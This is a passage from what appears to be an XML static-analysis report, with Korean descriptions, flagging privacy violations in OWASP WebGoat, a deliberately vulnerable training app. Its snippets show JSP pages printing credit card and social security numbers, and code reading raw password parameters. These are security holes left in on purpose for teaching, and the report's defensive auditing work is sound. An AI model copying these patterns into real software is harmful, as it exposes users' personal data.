					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D78ED427F0165C3E8E1B1981FA1CDD0C" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1D17CC1C85766D6D159A75DB22247288" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>272</LineStart>
<Snippet>		    SQLInjection.EMPLOYEE_ID);
	    String password = s.getParser().getRawParameter(
		    SQLInjection.PASSWORD);
	    switch (getStage(s))
	    {</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2FF12F36541D5129F589939A40C87447" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>73</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN_LIMIT%&gt;" type="text" value="&lt;%=employee.getCcnLimit()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>73</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN_LIMIT%&gt;" type="text" value="&lt;%=employee.getCcnLimit()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.CrossSiteScripting.CrossSiteScripting.CCN_LIMIT()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1FF4341E2F7F861BEA2708EBBB8C113F" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BA702E0AA648996AE8C3D20995234418" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>127</LineStart>
<Snippet>    {
	String username = s.getParser().getStringParameter(USERNAME, "");
	String password = s.getParser().getStringParameter(PASSWORD, "");

	if ((username.length() &gt; 0) &amp;&amp; (password.length() &gt; 0))</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakAuthenticationCookie.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6C721EF2E9704C4C94BFC11574CF04AD" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>151</LineStart>
<Snippet>
	String username = s.getParser().getStringParameter(USERNAME, "");
	String password = s.getParser().getStringParameter(PASSWORD, "");

	if (username.equals(user) &amp;&amp; password.equals(pass))</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.Challenge2Screen.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0C0D100B70B3A2BC5ABEB4C9B50E9312" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>80</LineStart>
<Snippet>    {
	String username = s.getParser().getRawParameter(USERNAME, "");
	String password = s.getParser().getRawParameter(PASSWORD, "");

	//&lt;START_OMIT_SOURCE&gt;</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.HtmlClues.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7BE7D98946A7E8421C7A0322CF9FA691" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    RoleBasedAccessControl.EMPLOYEE_ID);
	    String password = s.getParser().getStringParameter(
		    RoleBasedAccessControl.PASSWORD);

	    // Attempt authentication</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="02F53FC73CF2F826B49641D0B9BF0618" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>95</LineStart>
<Snippet>		    RoleBasedAccessControl.CCN);
	    int ccnLimit = s.getParser().getIntParameter(
		    RoleBasedAccessControl.CCN_LIMIT);
	    String disciplinaryActionDate = s.getParser().getStringParameter(
		    RoleBasedAccessControl.DISCIPLINARY_DATE);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN_LIMIT()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="234F492B9FA93BEC5CB835B914E130C3" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    RoleBasedAccessControl.EMPLOYEE_ID);
	    String password = s.getParser().getStringParameter(
		    RoleBasedAccessControl.PASSWORD);

	    // Attempt authentication</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4D6F5C54F83CEC6C7689E5E34BA02A74" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>272</LineStart>
<Snippet>		    SQLInjection.EMPLOYEE_ID);
	    String password = s.getParser().getRawParameter(
		    SQLInjection.PASSWORD);
	    switch (getStage(s))
	    {</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2C9157739B92714B9C6546FF18D977F7" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.SSN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3B4F1E48C9E2DA21983FB56198D0A6FF" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7C380BB1D04FBFFF8B3F9F961435359A" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>132</LineStart>
<Snippet>    public String getCcn()
    {
	return ccn;
    }
</Snippet>
<TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="16FB3C8A72EAF291CB7F34FE1378A80F" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>72</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN_LIMIT%&gt;" type="text" value="&lt;%=employee.getCcnLimit()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>72</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN_LIMIT%&gt;" type="text" value="&lt;%=employee.getCcnLimit()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN_LIMIT()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="69836F0C6868D3255303F4FBDCA94B26" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>142</LineStart>
<Snippet>	    }

	    String password = s.getParser().getRawParameter(PASSWORD, "");
	    if (password == null || password.length() == 0)
	    {</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.XPATHInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D5C76C17C5FE92CA3F31722313D1D577" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>232</LineStart>
<Snippet>	try
	{
	    password = s.getParser().getStringParameter(PASSWORD);
	}
	catch (ParameterNotFoundException pnfe)</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakSessionID.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="486B21E65ED03BDE62D69C141662A3CD" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>77</LineStart>
<Snippet>		    RoleBasedAccessControl.LAST_NAME);
	    String ssn = s.getParser().getStringParameter(
		    RoleBasedAccessControl.SSN);
	    String title = s.getParser().getStringParameter(
		    RoleBasedAccessControl.TITLE);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.SSN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="77DF5909919615C72040CCB859909E20" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>132</LineStart>
<Snippet>    public String getCcn()
    {
	return ccn;
    }
</Snippet>
<TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A53F0B8A0211B3999F8E0DFAA5FA0C2" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>151</LineStart>
<Snippet>
	String username = s.getParser().getStringParameter(USERNAME, "");
	String password = s.getParser().getStringParameter(PASSWORD, "");

	if (username.equals(user) &amp;&amp; password.equals(pass))</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.Challenge2Screen.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D7E5F214614A63EE2D8682A45EEE945B" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6955C21A4D2FDD288445BE697F5BF340" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
